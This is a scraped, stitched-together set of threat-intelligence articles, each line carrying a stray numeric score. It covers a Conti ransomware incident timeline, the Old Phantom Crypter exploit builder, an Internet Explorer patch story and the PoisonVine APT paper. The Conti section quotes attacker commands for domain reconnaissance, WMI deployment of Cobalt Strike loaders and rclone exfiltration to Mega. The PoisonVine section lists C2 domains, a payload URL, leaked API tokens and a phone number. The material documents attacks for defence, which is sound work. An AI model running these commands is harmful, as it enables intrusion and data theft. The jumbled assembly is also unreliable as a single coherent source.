In less than 24 hours after Rapid Response was engaged, most of the customer’s critical infrastructure was able to restart normal operation, and within 48 hours, the team confirmed the initial access point of the attack.
A thorough incident response plan is key to dealing with a similar Conti ransomware attack. Check out the Sophos IT admin’s guide to What to expect when you’ve been hit with Conti ransomware.
Let’s dig into the Conti attack, day-by-day, and in some cases minute-by-minute.
Day 1 – Initial access and scans
The initial access point for the attack was eventually determined to be a FortiGate firewall running vulnerable firmware, version 5.6.3 build 1547(GA). Once inside, the attacker gained access to two different servers simultaneously, down to the exact second.
It took the attacker exactly 16 minutes to exploit the vulnerable firewall and gain domain admin access to the two servers.
Over the next six hours, the attacker deployed a Cobalt Strike beacon on one of the servers and began running commands to gather a list of domain admin accounts:
cmd.exe /C nltest /dclist:[target company name]
cmd.exe /C net group “domain Admins” /domain
cmd.exe /C nltest /DOMAIN_TRUSTS
cmd.exe /C adft.bat
cmd.exe /C type shares.txt
And commands to map out the basic network topography:
ping <computer name>.<domain>.local -n 1
cmd.exe /C portscan <IP ranges> icmp 1024
On the second server, the attacker did nothing at first.
The victim identified and shut down the attack in progress on one server, unfortunately they did not detect the access the attacker had to the other server.
After the victim shut down the attacker’s access to the first server, it took just 15 minutes for the attacker to pivot to the second server, deploy another Cobalt Strike beacon and resume the attack. The attacker then used the domain admin account compromised to gain access to a third server and ran the following Windows Management Instrumentation (WMI) command to remotely deploy another Cobalt Strike beacon on the third server :
cmd.exe /C wmic /node:<IP Address> process call create “rundll32.exe
C:\Programdata\sys.dll entryPoint
Day 2
On the second day, Sophos did not detect any malicious activity.",0.01775225466621433
"Day 3 – Data exfiltration and credential gathering
Over the course of 10 hours on the third day of the attack, the threat actors identified directories with potentially valuable data and began exfiltration.
The attacker deployed RClone to the third server and created a config file with the login credentials for Mega. The directories exfiltrated included data from the Human Resources department, IT department, credit department, accounting, senior staff, and directories labeled as budget.
First, the attacker deployed RClone and created a config file containing the email and password for the Mega account where the exfiltrated data would be transferred.
rclone.exe  copy “\\<Server 3>\<Folder path>” remote:<victim name> -q –ignore-existing –auto-confirm –multi-thread-streams 12 –transfers 12
C:\Users\<compromised domain admin>\.config\rclone\rclone.conf
The attacker also executed a batch script, cp.bat, to search for user credentials by copying all XLSX files with the string “pas” in the filename.
Day 4 – Conti attacks and beginning of Rapid Response engagement
On day one of the attack, the threat actors had gathered a map of the victim’s network and saved text file lists of the endpoints and servers. At approximately 1:00 am local time on day 4, the attacker used batch scripts to loop through those lists of devices in order to copy Cobalt Strike loaders onto a total of nearly 300 endpoints and servers.
First, the attacker deployed a Cobalt Strike beacon to a fourth server as a test:
cmd.exe /C wmic /node: <Server 4 IP Address> process call create “rundll32.exe C:\Programdata\doc.dll entryPoint”
Next, the attacker executed a batch script, copy_files_srv.bat, to deploy the Cobalt Strike loader, doc.dll, on the target servers listed in srv.txt:
for /f %%i in (srv.txt) do copy “C:\ProgramData\doc.dll” \\%%i\c$\ProgramData\doc.dll
Then, the attacker executed another batch script, wm_start.bat, to run the Cobalt Strike loader on each server listed in srv.txt via rundll32.exe and initiate the beacon:
for /f %%i in (srv.txt) do wmic /node: %%i process call create “rundll32.exe C:\Programdata\doc.dll entryPoint”
These last two commands were then repeated with the batch script, copy_files_work.bat, and text file work.txt to deploy and initiate the Cobalt Strike beacons onto nearly 300 target endpoints on the victim’s network.
The Cobalt Strike beacons were kicked into gear 40 minutes after being loaded onto the target devices and used a technique called reflective DLL injection to launch Conti.
“A DLL file dropped onto the target devices connected to a C2 address and gets the ransomware code hosted there. The ransomware code is then executed directly in memory, meaning when it starts encrypting the target machine it has never been written to disk,” Peter Mackenzie, manager of Rapid Response said. “Despite how clever this is, Sophos Intercept X technology would still have no problem stopping it.”
The C2 addresses used were:",0.016738811402410847
"Docns[.]com/us/ky/louisville/312-s-fourth-st.html
docns[.]com/OrderEntryService.asmx/AddOrderLine
23[.]106[.]160[.]174",0.009805986573827474
"Over the course of the next 3 hours, Sophos Intercept X successfully detected and blocked Conti on all of the protected computers, but damage was done to unprotected devices. For more how the DLL reflection injection and Conti ransomware worked, check out the technical details on Conti ransomware by Sophos Uncut.
The customer blocked all internet traffic except Sophos, shut down critical infrastructure, and called Sophos Rapid Response.
Within the first 45 minutes Rapid Response was under contract, before even having the kickoff call to walk the customer through the service, the Rapid Response team had:",0.014615851051505868
"Identified the compromised account used in the attack
Identified and blocked the malicious DLL used to deploy Conti
Identified and blocked the command and control (C2) addresses used by the attacker
Identified all endpoints targeted
Deployed Sophos Managed Threat Response (MTR) to the customer environment
Begun collecting forensic evidence",0.020888696054847222
"In the 45 minutes following the kickoff call, the Rapid Response team also built a list of all the data exfiltrated by the attacker.
Day 5 – Back to normal
By the fifth day after the attacker first gained access to the victim’s network, and less than 24 hours from when Sophos Rapid Response was called in, the customer was able to restart most of their critical infrastructure to normal operation.
With the help of Rapid Response, all unprotected machines were recovered either from backups or by re-imaging, then protected with Sophos and multi-factor authentication was enabled on the customer’s VPN.
The investigation for Rapid Response was not over yet though. The team identified a possible second exfiltration of data, a second compromised account, and suspicious Remote Desktop Protocol (RDP) traffic through the vulnerable firewall.
Day 6 and 7 – Finishing up and handing off
With the attack stopped and recovery complete, all that was left was a bit of cleanup, including confirming the initial access method for the attacker and having the customer upgrade their firewall to close that vulnerable point.
Sophos Rapid Response then handed off the customer to the Sophos Managed Threat Response team to continue 24/7 monitoring.
Detection and IoCs
Components of Conti ransomware can detected in Sophos Endpoint Protection under the following definitions: HPmal/Conti-B, Mem/Conti-B, or Mem/Meter-D.
Additional indicators of compromise have been published to the SophosLabs Github.
Conti group Tactics, Techniques, and Procedures (TTPs)
In this case, the Conti group gained initial entry into victim environments by exploiting public facing applications (MITRE ATT&CK T1190) and using a compromised domain admin account (MITRE ATT&CK T1212) to facilitate lateral movement.
The threat actor exploited a vulnerability in FortiGate firewall version 5.6.3 build 1547(GA). Known exploits for this vulnerable firmware include one critically rated vulnerability (CVE-2018-13379) and one high rated vulnerability (CVE-2018-13374).
The group used multiple batch scripts for system network configuration discovery (MITRE ATT&CK T1016), remote system discovery (MITRE ATT&CK T1018), and network service scanning (MITRE ATT&CK T1046). Immediately following initial access, the threat actor searched to identify domain admin accounts (MITRE ATT&CK T1078.002) and network shares (MITRE ATT&CK T1021.002).
Deployment of Cobalt Strike beacons and loaders were performed using Windows Management Instrumentation commands (MITRE ATT&CK T1047).
The threat actor used RClone in order to exfiltrate data to file storage service MEGA (MITRE ATT&CK T1567.002).
Cobalt Strike beacons loaded onto all target systems to perform a DLL reflective injection attack (MITRE ATT&CK T1055.001), where a DLL called to C2 addresses to get the Conti code, then load it and execute it directly in memory without writing the ransomware to disk before encrypting data for impact (MITRE ATT&CK T1486).
If you are experiencing an active incident and need immediate response, contact Sophos Rapid Response. For details of our 24/7 Managed Threat Response (MTR) service, visit our website or speak with your Sophos representative.
Special thanks to Abhijit Gupta, Bill Kearney, David Anderson, Elida Leite, Kevin Simpson, Matthew Sharf, Paul Jacobs, Peter Mackenzie, Ratul Ghosh, Robert Weiland, Sergio Bestulic, Syed Shahram Ahmed, Varun Hirve, and Vikas Singh for their efforts in detecting, investigating, and responding to these threats.",0.01966701510064195
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"2
",0.012344956490214498
Old Phantom Crypter upends malicious document tools,0.008109303039476656
"As the new year began, the makers of tools that generate the malicious documents used in social engineering spam attacks threw out the rule book and started fresh with an entirely new batch of Office exploits",0.011928834963756407
"Written by
Gabor Szappanos",0.010394306867931857
"February 14, 2019",0.008779986962652253
SophosLabs Uncut builder Crypter maldoc Phantom,0.006978537697274967
"We regularly publish reports about the malicious Microsoft Office documents that are used in attacks. These maldocs are created by criminals who use tools called “builders” that automate the process of embedding any of an a-la carte menu of exploits into the maldocs. Studying these builders often reveals trends that victims are likely to see in the malspam they receive.
The most recent updates to these builders revealed a drastic change: The makers of these builders replaced both the old exploits — and the old exploit builders themselves — with next-generation offerings.
The old, established, dominant “brands” of maldoc builder tools (like Microsoft Word Intruder, Ancalog and AKBuilder) were abandoned, and these previously-dominant builders have been completely wiped out of the ecosystem. One of the most prominent newcomers is The Old Phantom Crypter. Our research paper details the characteristics of this kit and the malicious documents created with it.
We had observed that, as last year came to a close, maldocs created by the top 4 exploit builders were responsible for over 75% of all malspam attacks.
Exploit builders used in attacks in 2018 Q3
We had previously designated one of the most prevalent kits EQN_Kit2, because we didn’t know its “street name.” Now we know that this kit calls itself The Old Phantom Crypter. This kit generated samples with very distinguishing characteristics and has been very actively used (and updated) ever since.
The Old Phantom Crypter
For the past 11 months, we have seen an increasing flow of documents generated by EQN_Kit2, but we hadn’t been able to identify the source behind it. Until we ran into a black-market tool called The Old Phantom Crypter – then we realized that this is the mysterious kit that generates all these documents.
This kit a two-in-one solution. It originated as a PE cryptor, but later on additional functionality was integrated into it.
This additional functionality provided the means to deliver the protected executable by various methods, including Microsoft Office exploits.
Main screen of the builder
The license for this kit can be purchased via the main distribution web page for $199 per month, which positions it in the league of the most expensive builders in the market.
Purchasing the professional version
The builder supports a wide selection of Microsoft Office exploits, from the archaic CVE-2010-3333 to the recent CVE-2017-11882 Equation Editor exploit:
The extensive list of supported exploits
The builder itself is a .Net executable hidden form the analysis by using the Enigma Protector to hide the internal details. Enigma is a very powerful protection system.
It is also one of the few that use a software taggant mechanism that helps identify the malicious uses of the protector. It embeds a unique identifier in the protected executables; We can also use that marker to track the use of the product.
Taggant info within the executable
In case of the Old Phantom Crypter we found over 50 versions of other, totally unrelated software product protected by the same Enigma client. It is a possibility that the author of The Old Phantom is also the author of all other products. It is, however, a much more likely explanation that he uses a pirated version of Enigma, shared among many players in the underground scene.
Once the protection is stripped off, the unpacked program stores a collection of skeleton files as resources. These skeleton files serve as building blocks when the actual exploit document is generated.
Exploit templates stored in the resources
This approach is not unique among exploit builders: Ancalog used a similar concept of skeleton templates for the exploits. In fact, some of the templates used by The Old Phantom are taken from Ancalog, to keep the legacy alive. There is no similarity in the code itself, but it is quite possible that the overall design was inspired by Ancalog.
Customers and victims
Usually we don’t have insight into the customer base of a criminal software tool – those are sold on underground marketplaces, and both the seller and the buyers are interested in keeping their anonymity. However, due to a (possibly unintended) information disclosure failure we could get a reasonably good insight into the typical customers of the tool.
Download history of the test tool
From this we can conclude that the distribution may have started mid-March 2018, which matches the first large scale appearance of samples generated by the builder. Additionally, we can estimate the number of customers to be around 100.
Further data is available about the locations of the people who downloaded the tool (assuming they didn’t use a VPN).
Distribution of the potential users of the kit
There is no surprise here, the major users of the builder are the usual suspects: cybercriminals based in Nigeria and Russia.
Our 2018 Q3 stats also revealed the major targets of the infection campaigns powered by Old Phantom generated Office documents, which are mostly victims from the USA and EU.
Main targets of attacks
With reasonable confidence we can say that the Old Phantom Crypter is mostly used by a few dozen Nigerian and Russian criminals for attacking victims in North America and Western Europe.
Further details on the Old Phantom Crypter can be found in our technical paper.",0.02215029957306225
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Internet Explorer vulnerability will finally be patched on Tuesday after “months” of attacks
Internet Explorer users will be a great deal safer from Tuesday onwards, after Microsoft announced a patch for a vulnerability that has been exploited by attackers “for months” according to some reports.",0.01588327666992828
4 Oct 2013 - 12:14PM,0.011159874489735433
"Internet Explorer users will be a great deal safer from Tuesday onwards, after Microsoft announced a patch for a vulnerability that has been exploited by attackers “for months” according to some reports.",0.013613568327952796
"Internet Explorer users will be a great deal safer from Tuesday onwards, after Microsoft announced a patch for a vulnerability that has been exploited by attackers “for months” according to reports.",0.013613568327952796
"The  vulnerability has been used in targeted attacks against users in Japan and Taiwan, according to ComputerWorld, and experts feared that less-capable hackers would use the exploit after it was released as a module for the popular penetration-testing tool Metasploit.",0.018246543201965726
"The vulnerability affects all versions of Microsoft’s browser, and the patch will be released as part of Microsoft’s standard “Patch Tuesday” package.",0.008346050455305898
"On September 21, the Internet Storm Center raised its threat level to yellow in response to reports of attacks which exploited the vulnerability, saying, “The Internet Storm Center is beginning to see increased evidence of exploits in the wild regarding Microsoft Security Advisory 2887505.  Accordingly, we’re moving the InfoCon up to Yellow.”",0.015652768480507673
"“Today we’re providing advance notification for the release of eight bulletins, four Critical and four Important, for October 2013,” said Dustin Childs of Microsoft Trustworthy Computing in a blog post.",0.017909906528497666
"“The Critical updates address vulnerabilities in Internet Explorer, .NET Framework and Windows. The Critical update for Internet Explorer will be a cumulative update which will address the publicly disclosed issue described in Security Advisory 2887505.”",0.011338573622524772
"Earlier this week, the exploit had been released as a module for the popular penetration testing tool Metasploit – sparking fears of a new wave of attacks.",0.017173005377247086
"The open-source tool is used to test vulnerabilities, but Lucian Constantin of the IDG News Service suggested that, “An exploit for a vulnerability that affects all versions of Internet Explorer and has yet to be patched by Microsoft has been integrated into the open-source Metasploit penetration testing tool, a move that might spur an increasing number of attacks targeting the flaw.”",0.009946644307828767
"The module was posted by Metasploit contributor Wei Chen, who said, “Recently the public has shown a lot of interest in the new Internet Explorer vulnerability (CVE-2013-3893) that has been exploited in the wild, which was initially discovered in Japan. At the time of this writing there is still no patch available, but there is still at least a temporary fix-it that you can apply from Microsoft.”
https://community.rapid7.com/community/metasploit/blog",0.008408562877383674
"There have been multiple reports of the exploit being used in the wild, according to a report by PC World. PC World also suggested that while Metasploit is targeted at the researcher community, the release could lead to the exploit code landing in the hands of cybercriminals.",0.015810735533611453
Microsoft has already released an emergency fix for the vulnerability in all versions of Internet Explorer. Microsoft warns that targeted attacks have already attempted to exploit it,0.0057863872180849985
"In a blog post, Dustin Childs of Microsoft’s Security Response Center said that the risks for users lay in attackers compromising trusted websites – or convincing them to click links in emails or instant messages.",0.013516797722473162
"“This issue could allow remote code execution if an affected system browses to a website containing malicious content directed towards the specific browser type,” Childs wrote.  “This would typically occur when an attacker compromises the security of trusted websites regularly frequented, or convinces someone to click on a link in an email or instant message.”
",0.012668571388195438
VB2019 paper: A vine climbing over the Great Firewall: a long‑term attack against China,0.009503286662723931
Lion Gu & Bowen Pan,0.009675645226599139
"Qi An Xin Threat Intelligence Center, China",0.010334307009102539
"Table of contents
Abstract Introduction 11 years of campaigns Capabilities and cyber weapons RATs Poison Ivy ZxShell Kanbox RAT Custom shellcode loader Vulnerabilities CVE-2012-0158 CVE-2014-6352 CVE-2017-8759 Infrastructures Dynamic domain services Disguised legitimate websites Cloud storage Third-party blogger Tactics, techniques and procedures Data exfiltration and impact Attribution of the actor Conclusion Acknowledgement References",0.0110694529916332
Abstract,0.009485057568311417
"In this paper we will disclose details of a little-known APT group, PoisonVine, and its long history of cyberespionage activities lasting 11 years. The group is keen on Chinese entities and aims to harvest political and military intelligence. Targets include government agencies, military personnel, research institutes and maritime agencies. The group has compromised multiple entities successfully and is still active in 2019. We will describe the group’s campaigns in detail, including malware, vulnerabilities, infrastructure and TTP. Furthermore, we will shed light on the impact of the attacks and on actor attribution, thanks to mistakes made by the group when all stolen data, including profiles of victim machines and sensitive documents, was saved to cloud storage at the data exfiltration stage.",0.016440909950373173
Introduction,0.012036720276026314
"PoisonVine is a little-known Traditional Chinese-speaking APT group that was first disclosed in 2018 by Qi An Xin Threat Intelligence Center [1, 2]. Starting in 2007, the PoisonVine group has carried out 11 years of cyberespionage campaigns against Chinese key units and departments, including national defence, government, science and technology, education and maritime agencies. The group mainly targets the military industry, Sino-US relations, cross-strait relations and ocean‑related fields.",0.018794645236616336
"The PoisonVine group obtained an established foothold by sending spear-phishing emails and delivering decoy documents, the contents of which were closely related to the target industry or field (for example, specific conference materials, research papers or announcements). They mainly used implants including publicly available RATs and custom trojans, such as ZxShell and Poison Ivy, and preferred to use cloud storage for the exfiltration of stolen information.",0.019298146126132676
"Because the group mainly uses Poison Ivy and cloud storage, making it similar to vines that can climb across a wall, we named it ‘PoisonVine’.",0.013317412508227489
11 years of campaigns,0.009630436202320847
"The earliest activities of PoisonVine were seen in December 2007, since when the group has been active for 11 years. We list some of the major events in the timeline below:",0.0151862876066442
"In December 2007, the trojan associated with the group was first discovered. Marine-related fields (suspected to be related to a large shipping company) were involved.",0.01206525201531572
"In March 2008, a key laboratory (a scientific research institute) at a university in China was attacked.",0.012823085808540524
"In February 2009, attacks against the military industry began (involving a well-known military journal).",0.019959002688786587
"In October 2009, the trojan added a special method for avoiding detection via static scanning: API string reverse order. The method was used in most versions of the trojan and continued to be used until 2018.",0.010080217628568588
"In December 2011, the trojan added a special method to combat dynamic detection (error API parameters). Related methods were used in most versions of the trojan and continued to be used until 2015.",0.013151778483340593
"In February 2012, the first modified version of a backdoor based on ZxShell code was discovered. The key function was to steal document files such as .doc, .ppt, .xls and .wps.",0.010980515187347994
"In March 2013, intense attacks were conducted targeting the Chinese Academy of Sciences and a number of national ministries and commissions in the fields of science and technology, maritime affairs, etc.",0.01586279901048837
"In October 2013, a watering hole attack was carried out against a Chinese government website.",0.014602148586832397
"In May 2014, an evolved version of ZxShell was discovered. In addition to the functions based on the previous version, a search was added for keywords such as ‘military (军)’, ‘aviation (航)’, and ‘report (报告)’.",0.012699267701556605
"On 12 September 2014, events and samples related to CVE-2014-4114 (a zero-day vulnerability) were first discovered.",0.01722695532023044
"On 14 October 2014,
iSIGHT Partners
[
3
] released a report and disclosed CVE-2014-4114. On the same day,
Microsoft
released relevant security bulletins.",0.01609095963644147
"On 25 February 2015, an attack was detected against a military industry association (national defence technology) and the Chinese Academy of Engineering. Kanbox (酷盘) [
4
] samples were discovered.",0.009910271047831598
"In October 2017, the CVE-2017-8759 vulnerability document was used to initiate a spear‑phishing attack against a large media agency website and an individual working in Quanzhou.",0.011624855972529047
"In April 2018, the
Qi An Xin Threat Intelligence Center
disclosed the malicious attack code of the group, exploit CVE-2017-8759 [
1
].",0.009344778450236624
"In May 2018, the actor launched attacks against several maritime organizations including ship‑building companies and port‑operating companies.",0.01703129905912404
"In April 2019, the
Qi An Xin Threat Intelligence Center
found new samples using exploit CVE-2018-20250 [
5
] and
JianguoYun
cloud storage [
6
].",0.010646015430917477
Capabilities and cyber weapons,0.008100762009243478
"PoisonVine has used publicly available RATs, custom trojans and several vulnerabilities in its activities. In this section, we will analyse the group’s main capabilities and its cyber arsenal, including RATs, vulnerabilities and infrastructures.",0.01804134364366461
RATs,0.008046383712083105
Poison Ivy,0.00838885559643543
The Poison Ivy trojan is essentially a remote access trojan (RAT). FireEye conducted a special analysis of Poison Ivy [7]. The Poison Ivy trojan in this report corresponds to the 2.3.2 version. The Poison Ivy Trojan Generator has a total of 10 versions starting from version 1.0.0. The latest version is 2.3.2. The Poison Ivy Trojan Generator can generate both EXE and shellcode versions. The trojans generated in this case are in shellcode form. Most of the related mutexes use the default value of ‘)!VoqA.I4’.,0.012435044995251388
Figure 1: Poison Ivy Trojan Generator.,0.016870704836812522
The Poison Ivy trojan decrypts the shellcode using two rounds of a one-character XOR operation.,0.01737425485305255
Figure 2: Decrypting the shellcode using a one-character XOR operation.,0.022133483011302246
ZxShell,0.007723326305712486
"ZxShell was used by PoisonVine continuously from December 2007 until October 2014. Due to a large difference between the relevant versions, ZxShell can be regarded as existing in two versions. They are the internal published version and the open-source version. The first version refers to the ZxShell trojan used by PoisonVine from 2007 to 2012. The second version refers to the ZxShell trojan used by the group from 2012 to 2014. The related trojan is developed based on the open‑source version, which we call the secondary development version. The internal published version and the open-source version are both version 3.0. The former is not widely publicized, but intergrated with features. The latter version’s source code is widely distributed, and the functions are eliminated from the previous versions. For a more detailed analysis of ZxShell, please refer to Cisco’s report [8].",0.011830817747974565
"The samples we captured are based on ZxShell source code modifications. They have retained the original structure. ZxShell itself has more than 20 instructions. In addition to retaining some instructions, the samples we captured excluded a large number of instructions, such as: installation start, clone system account, shutdown firewall, port scan, proxy server and other functions, but had the ‘IEPass’ command added.",0.013190600734967806
Figure 3: The IEPass command.,0.013470648991712686
Kanbox RAT,0.007470932447196876
"Kanbox RAT is a customized tool which was developed by the group. It is often disguised as a folder icon. After execution, it will release the ‘svch0st.exe’ trojan file as well as the normal folder and a ‘.doc’ file to confuse the user.",0.010350685309129193
"‘svch0st.exe’ is a trojan transmitted using the SSL encryption protocol. It will execute all the trojan processes every hour, and the trojan processes will pack and upload all the information on the computer (including: file directory, system version, network card information, process list information, package specified files, network information and disk information), as well as files with related keywords (such as ‘Taiwan’, ‘Army’ and ‘War’ in Chinese), to the Kanbox that the attacker registered in advance via the SSL protocol.",0.010701723875770619
The C&C address is a Kanbox address. The file will be uploaded via the API provided by Kanbox. Kanbox is a free cloud service in China which provides online file storage services.,0.010750082336093758
Figure 4: The file is uploaded via the API provided by Kanbox.,0.01211450147462989
Figure 5: Kanbox.,0.015250056806769607
Custom shellcode loader,0.00795152140376898
"We discovered this custom shellcode loader in early 2018. The custom shellcode loader is delivered by a malicious HTA file, which will download and execute a PE implant.",0.014192410351654527
Figure 6: Custom shellcode loader.,0.016493131614623513
Figure 7: Malicious HTA file.,0.017263654461611266
"From the ‘SCLoaderByWeb’ string in the implant file, we believe, from the literal meaning, that the actor built it as a shellcode loader.",0.009522151809866042
"The loader program will first try to connect to a common URL to check network connectivity. If there is no connection, it will try to connect every five seconds until the network is connected. Then it downloads the payload from hxxp://updateinfo.servegame.org/tiny1detvghrt.tmp, as shown in Figure 8.",0.010976731445230592
Figure 8: The loader program.,0.014452870508347315
"The downloaded file is decrypted using a multiple round character XOR operation. For example, as shown in Figure 9, each round of the XOR key is 0xac, 0x5c, 0xdd, the result is equivalent to XOR 0x2d. After the decryption, the file will execute in a created thread.",0.015538440942425513
"Figure 9: Each round of the XOR key is 0xac, 0x5c, 0xdd, the result is equivalent to XOR 0x2d.",0.015314263663127048
The shellcode is generated by the Poison Ivy RAT.,0.012264775691480323
Vulnerabilities,0.0060250603944640435
CVE-2012-0158,0.009363303007165702
"CVE-2012-0158 is a vulnerability that could allow remote code execution – the attacker would have to convince users to open a specially crafted document. CVE-2012-0158 is typically exploited in the RTF and DOC formats, but the PoisonVine group saved the exploit document to MHT format, which helps avoid detection by anti-virus engines.",0.009998576497436518
Figure 10: The exploit document.,0.016593563571142167
CVE-2014-6352,0.008672442790167434
"CVE-2014-6352 is an OLE code execution vulnerability that can bypass the patch for CVE‑2014‑4114, a vulnerability of Windows OLE package manager code execution that has been exploited in the wild by the Sandworm APT group (found by iSIGHT Partners). CVE-2014-4114 is exploited by executing an INF file via a crafted OLE object in a PPSX document.",0.012988120776404433
"CVE-2014-6352 can bypass the patch for CVE-2014-4114. The patch for CVE-2014-4114 fixes the problem by adding a ‘MarkFileUnsafe’ function. The MarkFileUnsafe function sets the file security zone to URLZONE_INTERNET if it comes from a remote computer, and alerts the user when the file executes.",0.007194490909946283
"The CVE-2014-6352 exploit triggers the opening of an executable file, which is embedded in a PowerPoint document, directly and without using the INF file.",0.01468096338013769
We found the PoisonVine group using CVE-2014-6352 as a 0-day. Related samples are listed in the table below.,0.017187772285675806
MD5,0.009411548072560616
SHA256,0.009626279759872403
Filename,0.007907979926735642
da807804fa5f53f7cbcaac82b901689c,0.008869874127213295
"5e4a081a63f0122328e75cae991a1
9b3ae25af9c68bccf4ae514ce972ef
2148d",0.010147849013451005
"指挥控制专委会评审责
任书.ppsx",0.015626342391896086
19f967e27e21802fe92bc9705ae0a770,0.008388883139177516
"e99f089bf209d5caea948f424881c
bf6652658b973a5b97dbb59db6e0
3e8c907",0.010878404405535114
"南 海 课 题 项 目 建 议
书.ppsx",0.015449185204991278
"The earliest we found the exploitation document, which is named ‘指挥控制专委会评审责任书.ppsx’ in Chinese, was on 4 September 2014 based on the document created date. The first activities were captured on 12 September 2014.",0.011478608554815528
Figure 11: The exploitation document named ‘指挥控制专委会评审责任书.ppsx’.,0.016006826068111435
CVE-2017-8759,0.010356033234484419
We found several malicious HTA files on one of the remote servers used by the PoisonVine group. The content of the HTA file is as shown in Figure 12.,0.012618781856090888
Figure 12: The content of HTA.,0.01136442323592346
"We can certainly recognize these as exploits of CVE-2017-8759, so we believe the PoisonVine group also built a malicious document which exploits CVE-2017-8759. After the vulnerability is triggered, mshta.exe executes the HTA file remotely.",0.011467220599624572
The HTA file is an HTML page with malicious VBS code embedded. The VBS code calls POWERSHELL to download the subsequent exe loader.,0.01055885099901066
Figure 13: An HTML page with malicious VBS code embedded.,0.016880742775909452
Infrastructures,0.007354141882821463
The PoisonVine group preferred to use dynamic domain services and cloud storage for C&C and data exfiltration.,0.015369454458555531
Dynamic domain services,0.008382495650867683
The group used several DDNS services. The table below lists the distribution of the service providers’ usage. ChangeIP and No-IP are the group’s preferred choice.,0.013782579936110317
DDNS service provider,0.00803924809757639
Domains,0.008190947157367123
ChangeIP,0.008374124780245795
30,0.01155056622979278
No-IP,0.00916425661416942
9,0.013212450000046227
DynDNS,0.009320459084117605
2,0.012344956490214498
Afraid(FreeDNS),0.01311596415839078
1,0.011966970221767848
dnsExit,0.00848539908291046
1,0.011966970221767848
Disguised legitimate websites,0.00887895663791527
"The group used domains that mimicked those of legitimate Chinese websites to confuse their victims. They chose government websites, email service providers and the sites of some anti-virus software.",0.016496690413955517
C&C,0.009797034720276265
Legitimate website,0.008759734801119579
chinamil.lflink.com,0.009627426606703238
Website of Chinese Military: www.chinamil.com.cn,0.010199347591008379
soagov.sytes.net,0.009421227066127136
soagov.zapto.org,0.010160280629202822
soasoa.sytes.net,0.008836813123121234
State Oceanic Administration: www.soa.gov.cn,0.009847542123905262
xinhua.redirectme.net,0.010091842124605788
Xinhua News: www.xinhuanet.com,0.011719147800841712
126mailserver.serveftp.com,0.010051573961847082
mail163.mypop3.net,0.009474332409905473
"Famous mail service provider in China: 126.com, 163.com",0.00958047130840467
kav2011.mooo.com,0.011361667529002029
safe360.dns05.com,0.010028113225092783
cluster.safe360.dns05.com,0.010160372160233355
rising.linkpc.net,0.00939277593601362
Chinese anti-virus software,0.008236601836338786
Cloud storage,0.00828512261727199
"In previous activities, we found two samples that used Kanbox, a Chinese cloud storage service provider, for data exfiltration.",0.01352338700627942
client_id,0.00848987936919321
client_secret,0.008503094760301644
refresh_token,0.00912182778070214
"3edfe684ded31a7cca6378c022
6f5629",0.008930259728921253
"bfa89eebf29032076e9cffb755
49fee5",0.008887507118635951
"75cdc35b1cdaee24047f3afb23
a5ccce",0.009194510498158892
"7a5691b81bf4322fd88f5fa994
07fbbc",0.0093724351165686
"d44cfa7dd3c852b69c59efacf76
6cc23",0.009010800714369993
"14b6685330bf32a22688910e7
65b5dce",0.008660125658477402
"By using the token and Kanbox API we can retrieve the register information, which contains a telephone number:",0.00834725048811058
"{""status"":""ok"",""email"":"""",""phone"":""15811848796"",""spaceQuota"":1700807049216,""spaceUsed"":508800279,""emailIsActive"":0,""phoneIsActive"":1}",0.012196071683114873
Third-party blogger,0.009024962863452224
"The PoisonVine group also use blogging services for payload transmission. In their previous activities they used Sina, which is a popular blogging service in China. By using a blogging service and hiding malicious code in the blog content, it is easy to penetrate target organization networks without triggering a firewall alert.",0.01092600422439105
Figure 14: Malicious code hidden in blog content.,0.014660258826907802
"Tactics, techniques and procedures",0.009704505326496027
"The PoisonVine group used spear-phishing emails to deliver decoy documents or achieve an executable payload. The content of the email and attached file appear sufficiently legitimate to confuse the targeted victim. If the target opens the attached file, some vulnerabilities are triggered and payloads are executed. In this way the actor gains initial access to target networks.",0.011306287610649335
Figure 15: The content of the email.,0.014287951661193565
Figure 16: The attached file.,0.017004220721302254
Figure 17: Payloads executed.,0.018175620061808173
"The actor also used RLO, appending a number of spaces to the end of the filename, and disguising the file using a legitimate software icon such as a folder or Office document. These techniques help to hide the file extension name and confuse the target victim.",0.015036326587768989
Figure 18: The actor also used RLO and appended a number of spaces to the end of the file name.,0.012774671289888961
"The implant RATs used some techniques to evade detection. One of the evasion techniques is to reverse the order of the API names. When the trojan executes, the reverse string is converted to a normal API string by the ‘_strrev’ function, and the ‘GetProcAddress’ function is called to dynamically obtain the API address. The use of reverse order API strings increases the difficulty of string detection. In addition, the API address is obtained dynamically during the execution of the trojan, which is difficult to detect in the static information of the PE, which increases the difficulty of API detection. This technique is known to have been used between 2009 and 2018.",0.011912071285602788
Figure 19: API names are reversed.,0.019668404270057116
"Another way to evade detection systems is to pass the wrong parameter to the ‘GetClientRect’ function. The first parameter of GetClientRect is to obtain a target window handler. The trojan passes 0 to GetClientRect, which will fail forever in the Windows operating system, and the return value is 0. At present, many anti-virus solutions use dynamic scanning technology (mostly in heuristic detection). The simulation of executing the GetClientRect function does not consider error parameters, meaning that the GetClientRect function is always executed successfully by simulation, and the return value is non-zero. In this way, the anti-virus software’s virtual environment and the user’s real system can be distinguished by trojans, thus allowing them to bypass anti-virus software detection.",0.016784308256327374
Figure 20: Another way to evade detection systems is to pass the wrong parameter to ‘GetClientRect’.,0.010325688985114323
"After implanting the RATs in the target endpoint, information will be collected from the local system, including MAC address, operating system version, host name, user name, process list, disk volume information, and so on. It will also scan the document files for filename that contain hard‑coded keywords, such as ‘military (军)’, ‘international (国际)’, ‘Taiwan (对台)’, ‘technology (科技)’ and ‘national (国)’ (see Figure 21).",0.016653187481013965
Figure 21: Hard-coded keywords.,0.01585587270951061
The following is a list of MITRE ATT&CK techniques we have observed based on our analysis of the PoisonVine group.,0.016444735106149966
T1193 Spearphishing Attachment,0.013281019129413707
T1203 Exploitation for Client Execution,0.007860568809400226
T1204 User Execution,0.00869828130790784
T1170 Mshta,0.009735845562422463
T1064 Scripting,0.011758430672725417
T1102 Web Service,0.008362996719382232
T1022 Data Encrypted,0.010349043944160918
T1005 Data from Local System,0.008583806914819525
Data exfiltration and impact,0.007233395261027398
The PoisonVine group used cloud storage to store the exfiltration data – the access token was embedded in the implant. This is helpful for security researchers investigating the exfiltration data and the real impact of the attack on the victims.,0.010317633858979991
